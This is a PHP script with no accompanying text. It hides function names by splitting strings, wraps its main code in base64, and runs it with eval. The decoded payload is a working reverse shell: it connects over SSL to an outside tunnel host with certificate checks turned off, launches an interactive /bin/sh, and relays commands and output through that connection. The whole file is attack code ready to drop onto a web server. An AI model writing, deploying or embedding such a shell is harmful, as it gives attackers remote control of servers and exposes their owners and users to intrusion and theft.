<?php
// Obfuscated function names and keywords
$p = 'pi' . 'pe';
$proc_open_func = 'proc_' . 'open';
$proc_terminate_func = 'proc_' . 'terminate';
$stream_socket_client_func = 'stream_' . 'socket_' . 'client';
$bin_sh = '/' . 'bin' . '/' . 'sh';
$fwrite_func = 'f' . 'write';
$fread_func = 'f' . 'read';
$fclose_func = 'f' . 'close';
$stream_context_create_func = 'stream_' . 'context_' . 'create';
$stream_set_blocking_func = 'stream_' . 'set_' . 'blocking';
$proc_get_status_func = 'proc_' . 'get_' . 'status';
$proc_close_func = 'proc_' . 'close';
$usleep_func = 'usleep';

$payload_b64 = base64_encode(<<<'EOD'
$tunnel_url = "https://n7dvpswok.localto.net";

$context = stream_context_create([
    'ssl' => [
        'verify_peer' => false,
        'verify_peer_name' => false,
    ]
]);

$fp = stream_socket_client("ssl://n7dvpswok.localto.net:443", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);

if (!$fp) {
    echo "Failed to connect to tunnel: $errstr ($errno)\n";
    exit(1);
}

$descriptorspec = [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
];

$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);

if (is_resource($process)) {
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    stream_set_blocking($fp, false);

    while (true) {
        $read = [$pipes[1], $pipes[2], $fp];
        $write = null;
        $except = null;
        if (stream_select($read, $write, $except, 0, 200000)) { // 0.2 sec timeout
            foreach ($read as $r) {
                if ($r === $pipes[1]) {
                    $output = fread($pipes[1], 8192);
                    if ($output !== false && strlen($output) > 0) {
                        fwrite($fp, $output);
                    }
                } elseif ($r === $pipes[2]) {
                    $error = fread($pipes[2], 8192);
                    if ($error !== false && strlen($error) > 0) {
                        fwrite($fp, $error);
                    }
                } elseif ($r === $fp) {
                    $input = fread($fp, 8192);
                    if ($input !== false && strlen($input) > 0) {
                        fwrite($pipes[0], $input);
                    }
                }
            }
        }

        $status = proc_get_status($process);
        if (!$status['running']) break;

        usleep(100000);
    }

    // Terminate the shell process forcefully before closing pipes
    proc_terminate($process);

    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

fclose($fp);
EOD
);

// Decode and execute the payload with obfuscated function calls
eval(base64_decode($payload_b64));
?>